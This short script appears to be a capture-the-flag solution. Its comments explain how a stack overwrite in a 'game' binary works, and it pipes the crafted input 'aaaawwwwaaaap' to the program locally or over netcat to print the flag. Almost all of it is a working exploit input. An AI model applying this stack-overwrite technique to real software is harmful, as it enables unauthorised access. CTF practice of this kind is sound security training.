# we need to write 1 byte after player's data on stack, which can be get by 'a' instruction
# , after write on memory, use 'p' to get flag

echo 'aaaawwwwaaaap' | ./game
# remotely change './game' to 'nc xxxx xxxx'